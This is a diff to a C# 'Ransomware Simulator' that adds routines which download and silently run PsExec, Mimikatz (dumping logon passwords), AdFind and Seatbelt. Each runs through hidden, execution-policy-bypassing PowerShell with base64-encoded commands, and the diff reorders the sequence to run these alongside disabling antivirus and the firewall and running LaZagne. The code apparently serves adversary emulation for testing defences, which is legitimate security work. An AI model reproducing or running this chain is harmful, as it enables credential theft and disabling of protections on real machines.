@@ -4,6 +4,8 @@
 # Description:  Ransomware Simulator
 # Version:      0.1
 # Released at:  2020/07/05
+# Version:      0.2 (Dev)
+# Released at:  xxxx/xx/xx
 ########################################################################################*/
 
 using System;
@@ -150,10 +152,40 @@ namespace Ransim
             /* Runs Invoke-WebRequest -URI https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe -Out $env:temp\laz.exe; Start-Process $env:temp\laz.exe -ArgumentList "memory" -NoNewWindow */
             Process.Start("powershell.exe", "-nop - win hid - exec bypass - encodedcommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAFIASQAgAGgAdAB0AHAAcwA6AC8ALwBnAGkAdABoAHUAYgAuAGMAbwBtAC8AQQBsAGUAcwBzAGEAbgBkAHIAbwBaAC8ATABhAFoAYQBnAG4AZQAvAHIAZQBsAGUAYQBzAGUAcwAvAGQAbwB3AG4AbABvAGEAZAAvADIALgA0AC4AMwAvAGwAYQB6AGEAZwBuAGUALgBlAHgAZQAgAC0ATwB1AHQAIAAkAGUAbgB2ADoAdABlAG0AcABcAGwAYQB6AC4AZQB4AGUAOwAgAFMAdABhAHIAdAAtAFAAcgBvAGMAZQBzAHMAIAAkAGUAbgB2ADoAdABlAG0AcABcAGwAYQB6AC4AZQB4AGUAIAAtAEEAcgBnAHUAbQBlAG4AdABMAGkAcwB0ACAAIgBtAGUAbQBvAHIAeQAiACAALQBOAG8ATgBlAHcAVwBpAG4AZABvAHcADQAKAA==");
         }
+
+        static void RunPsExec()
+        {
+            // Fetch and run PsExec
+            /* Runs Invoke-WebRequest -URI https://live.sysinternals.com/PsExec64.exe -Out $env:temp\psexec.exe; Start-Process $env:temp\psexec.exe -ArgumentList "-r SysUpdate ipconfig" -NoNewWindow */
+            Process.Start("powershell.exe", "-nop - win hid - exec bypass - encodedcommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAFIASQAgAGgAdAB0AHAAcwA6AC8ALwBsAGkAdgBlAC4AcwB5AHMAaQBuAHQAZQByAG4AYQBsAHMALgBjAG8AbQAvAFAAcwBFAHgAZQBjADYANAAuAGUAeABlACAALQBPAHUAdAAgACQAZQBuAHYAOgB0AGUAbQBwAFwAcABzAGUAeABlAGMALgBlAHgAZQA7ACAAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACQAZQBuAHYAOgB0AGUAbQBwAFwAcABzAGUAeABlAGMALgBlAHgAZQAgAC0AQQByAGcAdQBtAGUAbgB0AEwAaQBzAHQAIAAiAC0AcgAgAFMAeQBzAFUAcABkAGEAdABlACAAaQBwAGMAbwBuAGYAaQBnACIAIAAtAE4AbwBOAGUAdwBXAGkAbgBkAG8AdwA=");
+        }
+
+        static void RunMimikatz()
+        {
+            // Fetch and run Mimikatz
+            /* Runs Invoke-WebRequest -URI https://github.com/d4rk-d4nph3/Ransim/raw/v0.2/Tools/Mimikatz.exe -Out $env:temp\mimikatz.exe; Start-Process $env:temp\mimikatz.exe -ArgumentList '"privilege::debug" "sekurlsa::logonpasswords"' -NoNewWindow */
+            Process.Start("powershell.exe", "-nop - win hid - exec bypass - encodedcommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAFIASQAgAGgAdAB0AHAAcwA6AC8ALwBnAGkAdABoAHUAYgAuAGMAbwBtAC8AZAA0AHIAawAtAGQANABuAHAAaAAzAC8AUgBhAG4AcwBpAG0ALwByAGEAdwAvAHYAMAAuADIALwBUAG8AbwBsAHMALwBNAGkAbQBpAGsAYQB0AHoALgBlAHgAZQAgAC0ATwB1AHQAIAAkAGUAbgB2ADoAdABlAG0AcABcAG0AaQBtAGkAawBhAHQAegAuAGUAeABlADsAIABTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAJABlAG4AdgA6AHQAZQBtAHAAXABtAGkAbQBpAGsAYQB0AHoALgBlAHgAZQAgAC0AQQByAGcAdQBtAGUAbgB0AEwAaQBzAHQAIAAnACIAcAByAGkAdgBpAGwAZQBnAGUAOgA6AGQAZQBiAHUAZwAiACAAIgBzAGUAawB1AHIAbABzAGEAOgA6AGwAbwBnAG8AbgBwAGEAcwBzAHcAbwByAGQAcwAiACcAIAAtAE4AbwBOAGUAdwBXAGkAbgBkAG8AdwA=");
+        }
+
+        static void RunADFind()
+        {
+            // Fetch and run ADFind batch file
+            /* Runs Invoke-WebRequest -URI https://github.com/d4rk-d4nph3/Ransim/raw/v0.2/Tools/AdFind.exe -Out $env:programdata\adfind.exe; Invoke-WebRequest -URI https://raw.githubusercontent.com/d4rk-d4nph3/Ransim/v0.2/Tools/adfind.bat -Out $env:programdata\adfind.bat; Start-Process C:\Windows\System32\cmd.exe -ArgumentList "/c $env:programdata\adfind.bat" -NoNewWindow */
+            Process.Start("powershell.exe", "-nop - win hid - exec bypass - encodedcommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAFIASQAgAGgAdAB0AHAAcwA6AC8ALwBnAGkAdABoAHUAYgAuAGMAbwBtAC8AZAA0AHIAawAtAGQANABuAHAAaAAzAC8AUgBhAG4AcwBpAG0ALwByAGEAdwAvAHYAMAAuADIALwBUAG8AbwBsAHMALwBBAGQARgBpAG4AZAAuAGUAeABlACAALQBPAHUAdAAgACQAZQBuAHYAOgBwAHIAbwBnAHIAYQBtAGQAYQB0AGEAXABhAGQAZgBpAG4AZAAuAGUAeABlADsAIABJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUAUgBJACAAaAB0AHQAcABzADoALwAvAHIAYQB3AC4AZwBpAHQAaAB1AGIAdQBzAGUAcgBjAG8AbgB0AGUAbgB0AC4AYwBvAG0ALwBkADQAcgBrAC0AZAA0AG4AcABoADMALwBSAGEAbgBzAGkAbQAvAHYAMAAuADIALwBUAG8AbwBsAHMALwBhAGQAZgBpAG4AZAAuAGIAYQB0ACAALQBPAHUAdAAgACQAZQBuAHYAOgBwAHIAbwBnAHIAYQBtAGQAYQB0AGEAXABhAGQAZgBpAG4AZAAuAGIAYQB0ADsAIABTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFMAeQBzAHQAZQBtADMAMgBcAGMAbQBkAC4AZQB4AGUAIAAtAEEAcgBnAHUAbQBlAG4AdABMAGkAcwB0ACAAIgAvAGMAIAAkAGUAbgB2ADoAcAByAG8AZwByAGEAbQBkAGEAdABhAFwAYQBkAGYAaQBuAGQALgBiAGEAdAAiACAALQBOAG8ATgBlAHcAVwBpAG4AZABvAHcA");
+        }
+
+        static void RunSeatbelt()
+        {
+            // Fetch and run Seatbelt from Flangvik's SharpCollection
+            /* Invoke-WebRequest -URI https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/Seatbelt.exe -Out $env:temp\seatbelt.exe; Start-Process $env:temp\seatbelt.exe -ArgumentList "-group=system" -NoNewWindow */
+            Process.Start("powershell.exe", "-nop - win hid - exec bypass - encodedcommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAFIASQAgAGgAdAB0AHAAcwA6AC8ALwBnAGkAdABoAHUAYgAuAGMAbwBtAC8ARgBsAGEAbgBnAHYAaQBrAC8AUwBoAGEAcgBwAEMAbwBsAGwAZQBjAHQAaQBvAG4ALwByAGEAdwAvAG0AYQBzAHQAZQByAC8ATgBlAHQARgByAGEAbQBlAHcAbwByAGsAXwA0AC4ANwBfAHgANgA0AC8AUwBlAGEAdABiAGUAbAB0AC4AZQB4AGUAIAAtAE8AdQB0ACAAJABlAG4AdgA6AHQAZQBtAHAAXABzAGUAYQB0AGIAZQBsAHQALgBlAHgAZQA7ACAAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACQAZQBuAHYAOgB0AGUAbQBwAFwAcwBlAGEAdABiAGUAbAB0AC4AZQB4AGUAIAAtAEEAcgBnAHUAbQBlAG4AdABMAGkAcwB0ACAAIgAtAGcAcgBvAHUAcAA9AHMAeQBzAHQAZQBtACIAIAAtAE4AbwBOAGUAdwBXAGkAbgBkAG8AdwA=");
+        }
+
         static void DisableFirewall()
         {
             Process.Start(@"C:\Windows\System32\netsh.exe", "advfirewall set allprofiles state off");
         }
+
         static void DisableAV()
         {
             // Disable Defender's Real-Time Monitoring
@@ -257,8 +289,12 @@ namespace Ransim
             LocationCheck();
 
             RunRecon();
-
+            RunADFind();
+            RunSeatbelt();
+            RunPsExec();
             DisableAV();
+            RunLaZagne();
+            RunMimikatz();
 
             DisableFirewall();
 
@@ -268,9 +304,6 @@ namespace Ransim
             StopServices();
 
             RunPowerView();
-            RunLaZagne();
-            InvokeGPPPassword();
-            InvokeKerberoast();
 
             return;
             Console.WriteLine("Starting encryption process");
